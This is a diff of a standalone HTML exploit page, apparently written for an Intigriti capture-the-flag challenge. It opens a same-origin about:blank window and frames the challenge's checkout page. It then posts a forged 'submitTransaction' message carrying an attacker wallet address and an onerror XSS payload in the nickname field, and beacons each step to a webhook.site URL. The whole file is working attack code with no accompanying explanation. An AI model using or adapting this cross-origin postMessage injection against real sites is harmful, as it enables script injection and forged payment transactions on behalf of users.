@@ -1,56 +1,58 @@
 <!DOCTYPE html>
-<html><head><title>Srcdoc Exploit</title></head>
+<html><head><title>Blank Exploit</title></head>
 <body>
 <h2>Exploit</h2>
-<pre id=log></pre>
-<iframe id="x" style="display:none"></iframe>
 <script>
 const WEBHOOK = 'https://webhook.site/f3aaf033-eed4-43c9-804b-9f0404dcded6';
 const WALLET = '16472226db03703a192aa383237035a69f';
-const log = document.getElementById('log');
 
-function report(s) { log.textContent += '\n' + s; fetch(WEBHOOK + '?s=' + s).catch(()=>{}); }
+fetch(WEBHOOK + '?s=1_START').catch(()=>{});
 
-report('1_START');
+// Open about:blank (same-origin)
+const blank = window.open('about:blank', '_blank');
 
-// Use srcdoc to create a same-origin iframe
-const iframe = document.getElementById('x');
-iframe.srcdoc = `
-    <!DOCTYPE html>
-    <body>
-    <script>
-        const parentOrigin = 'https://challenge-0126.intigriti.io';
-        const iframe = document.createElement('iframe');
-        iframe.src = parentOrigin + '/checkout.html?currency=1337COIN&price=1';
-        document.body.appendChild(iframe);
-        
-        iframe.onload = function() {
-            parent.postMessage('IFRAME_LOADED', '*');
+if (blank) {
+    fetch(WEBHOOK + '?s=2_BLANK_OPENED').catch(()=>{});
+    
+    // Write HTML to the blank window
+    blank.document.write(`
+        <!DOCTYPE html>
+        <body>
+        <h3>Loading...</h3>
+        <iframe id="x" src="https://challenge-0126.intigriti.io/checkout.html?currency=1337COIN&price=1" style="display:none"></iframe>
+        <script>
+            const WEBHOOK = '${WEBHOOK}';
+            const WALLET = '${WALLET}';
             
-            setTimeout(function() {
-                iframe.contentWindow.postMessage({
-                    type: 'submitTransaction',
-                    transaction: {
-                        toAddress: '${WALLET}',
-                        currency: '1337COIN',
-                        amount: 1,
-                        nickname: '<img src=x onerror="alert(\\'gigawatz\\')">'
-                    }
-                }, parentOrigin);
+            fetch(WEBHOOK + '?s=3_IFRAME_IN_BLANK').catch(()=>{});
+            
+            document.getElementById('x').onload = function() {
+                fetch(WEBHOOK + '?s=4_IFRAME_LOADED').catch(()=>{});
                 
-                parent.postMessage('POSTMESSAGE_SENT', '*');
-            }, 2000);
-        };
-    </script>
-    </body>
-</html>
-`;
-
-report('2_SRCDOC_SET');
-
-window.addEventListener('message', function(e) {
-    report('MSG_' + e.data);
-});
+                setTimeout(function() {
+                    document.getElementById('x').contentWindow.postMessage({
+                        type: 'submitTransaction',
+                        transaction: {
+                            toAddress: WALLET,
+                            currency: '1337COIN',
+                            amount: 1,
+                            nickname: '<img src=x onerror="alert(\\'gigawatz\\')">'
+                        }
+                    }, '*');
+                    
+                    fetch(WEBHOOK + '?s=5_POSTMESSAGE_SENT').catch(()=>{});
+                }, 2000);
+            };
+        <\/script>
+        </body>
+        </html>
+    `);
+    blank.document.close();
+    
+    fetch(WEBHOOK + '?s=2_WRITTEN').catch(()=>{});
+} else {
+    fetch(WEBHOOK + '?s=2_BLOCKED').catch(()=>{});
+}
 </script>
 </body>
 </html>
